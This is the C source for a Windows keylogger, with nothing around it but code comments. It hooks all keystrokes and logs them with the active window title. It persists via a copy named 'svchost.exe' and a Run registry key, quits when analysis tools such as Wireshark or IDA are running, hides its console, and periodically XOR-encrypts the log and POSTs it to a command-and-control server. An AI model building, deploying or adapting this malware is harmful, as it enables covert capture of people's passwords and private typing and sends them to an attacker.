#include "keylogger.h"
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>

// Global variables
HHOOK g_keyboardHook = NULL;
FILE* g_logFile = NULL;
DWORD g_lastSendTime = 0;

// Install persistence mechanism 
bool installPersistence(void) {
    char exePath[MAX_PATH];
    char targetPath[MAX_PATH];
    
    // Get the path of the current executable
    GetModuleFileName(NULL, exePath, MAX_PATH);
    
    // Set target path in AppData folder
    sprintf(targetPath, "%s\\svchost.exe", getenv("APPDATA"));
    
    // Copy executable to target location if not already there
    if (strcmp(exePath, targetPath) != 0) {
        if (!CopyFile(exePath, targetPath, FALSE)) {
            return false;
        }
    }
    
    // Add to registry for startup
    HKEY hKey;
    if (RegOpenKeyEx(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    if (RegSetValueEx(hKey, "System Service", 0, REG_SZ, (BYTE*)targetPath, strlen(targetPath) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
    
    RegCloseKey(hKey);
    return true;
}

// Keyboard hook procedure
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        
        // Get the window title
        char* windowTitle = getCurrentWindowTitle();
        
        // Format and write to log
        char keyInfo[512];
        char keyName[16];
        
        // Get the key name
        DWORD scanCode = kbStruct->scanCode;
        if (vkCode == VK_RETURN) {
            strcpy(keyName, "[ENTER]");
        } else if (vkCode == VK_SPACE) {
            strcpy(keyName, " ");
        } else if (vkCode == VK_TAB) {
            strcpy(keyName, "[TAB]");
        } else if (vkCode == VK_BACK) {
            strcpy(keyName, "[BACKSPACE]");
        } else if (vkCode == VK_SHIFT) {
            strcpy(keyName, "[SHIFT]");
        } else if (vkCode == VK_CONTROL) {
            strcpy(keyName, "[CTRL]");
        } else if (vkCode == VK_ESCAPE) {
            strcpy(keyName, "[ESC]");
        } else {
            // Get the actual character
            BYTE keyState[256];
            GetKeyboardState(keyState);
            
            WORD character;
            ToAscii(vkCode, scanCode, keyState, &character, 0);
            
            keyName[0] = (char)character;
            keyName[1] = '\0';
        }
        
        // Format with timestamp and window info
        time_t currentTime = time(NULL);
        struct tm* timeInfo = localtime(&currentTime);
        char timeStr[20];
        strftime(timeStr, 20, "%Y-%m-%d %H:%M:%S", timeInfo);
        
        sprintf(keyInfo, "[%s] Window: %s | Key: %s\n", 
                timeStr, windowTitle, keyName);
        
        // Write to log
        writeToLog(keyInfo);
        
        // Free the window title
        free(windowTitle);
        
        // Check if it's time to send data to C2
        DWORD currentTick = GetTickCount();
        if ((currentTick - g_lastSendTime) / 1000 > SEND_INTERVAL) {
            g_lastSendTime = currentTick;
            
            // Close the file to flush contents
            if (g_logFile) {
                fclose(g_logFile);
                g_logFile = NULL;
            }
            
            // Read the file, send it to C2, then clear it
            FILE* readFile = fopen(LOG_FILENAME, "rb");
            if (readFile) {
                // Get file size
                fseek(readFile, 0, SEEK_END);
                long fileSize = ftell(readFile);
                fseek(readFile, 0, SEEK_SET);
                
                if (fileSize > 0) {
                    // Read entire file
                    char* buffer = (char*)malloc(fileSize);
                    if (buffer) {
                        fread(buffer, 1, fileSize, readFile);
                        
                        // Send to C2
                        sendDataToC2(buffer, fileSize);
                        
                        // Clean up
                        free(buffer);
                    }
                }
                
                fclose(readFile);
                
                // Clear the log file
                g_logFile = fopen(LOG_FILENAME, "w");
                if (g_logFile) {
                    fclose(g_logFile);
                    g_logFile = NULL;
                }
                
                // Reopen for append
                g_logFile = fopen(LOG_FILENAME, "a");
            }
        }
    }
    
    // Pass to the next hook in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Write data to log file
void writeToLog(const char* text) {
    if (!g_logFile) {
        g_logFile = fopen(LOG_FILENAME, "a");
        if (!g_logFile) return;
    }
    
    // Write data
    fputs(text, g_logFile);
    fflush(g_logFile);
}

// Simple XOR encryption
void encryptData(char* data, size_t length) {
    for (size_t i = 0; i < length; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY;
    }
}

// Send data to command and control server
bool sendDataToC2(const char* data, size_t length) {
    // Create encrypted copy of data
    char* encryptedData = (char*)malloc(length);
    if (!encryptedData) return false;
    
    memcpy(encryptedData, data, length);
    encryptData(encryptedData, length);
    
    // Initialize WinINet
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        free(encryptedData);
        return false;
    }
    
    // Open connection to C2
    HINTERNET hConnect = InternetOpenUrlA(hInternet, C2_SERVER, NULL, 0, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        free(encryptedData);
        return false;
    }
    
    // Send data as POST
    DWORD bytesSent = 0;
    BOOL result = HttpSendRequest(hConnect, NULL, 0, encryptedData, length);
    
    // Clean up
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(encryptedData);
    
    return result;
}

// Check for security tools that could detect this malware
bool checkForSecurityTools(void) {
    const char* securityTools[] = {
        "wireshark.exe", "procmon.exe", "procexp.exe", "ollydbg.exe",
        "processhacker.exe", "tcpview.exe", "autoruns.exe", "autorunsc.exe",
        "filemon.exe", "regmon.exe", "procmon.exe", "idaq.exe", "ida64.exe"
    };
    int numTools = sizeof(securityTools) / sizeof(securityTools[0]);
    
    HANDLE processSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processSnap == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(processSnap, &pe32)) {
        CloseHandle(processSnap);
        return false;
    }
    
    do {
        for (int i = 0; i < numTools; i++) {
            if (_stricmp(pe32.szExeFile, securityTools[i]) == 0) {
                CloseHandle(processSnap);
                return true; // Found a security tool
            }
        }
    } while (Process32Next(processSnap, &pe32));
    
    CloseHandle(processSnap);
    return false;
}

// Try to hide process from task manager
bool hideProcess(void) {
    // This is a placeholder for actual process hiding techniques
    // Real malware would implement more sophisticated methods
    return true;
}

// Get the title of the current active window
char* getCurrentWindowTitle(void) {
    char* windowTitle = (char*)malloc(256);
    if (!windowTitle) return NULL;
    
    HWND foreground = GetForegroundWindow();
    if (foreground) {
        GetWindowTextA(foreground, windowTitle, 256);
    } else {
        strcpy(windowTitle, "Unknown");
    }
    
    return windowTitle;
}

// Start the keylogger
bool startKeylogger(void) {
    // Check if we're already running on the system
    HANDLE mutex = CreateMutex(NULL, TRUE, "SimpleKeyloggerMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return false;
    }
    
    // Check for security tools
    if (checkForSecurityTools()) {
        // Security tools detected, don't continue
        return false;
    }
    
    // Install persistence
    installPersistence();
    
    // Hide our process
    hideProcess();
    
    // Set up the keyboard hook
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
    if (!g_keyboardHook) {
        return false;
    }
    
    // Initialize last send time
    g_lastSendTime = GetTickCount();
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return true;
}

// Clean up resources
void cleanupKeylogger(void) {
    if (g_keyboardHook) {
        UnhookWindowsHookEx(g_keyboardHook);
        g_keyboardHook = NULL;
    }
    
    if (g_logFile) {
        fclose(g_logFile);
        g_logFile = NULL;
    }
}

// Main entry point
int main(void) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Start keylogger
    if (!startKeylogger()) {
        return 1;
    }
    
    // Clean up before exit
    cleanupKeylogger();
    return 0;
}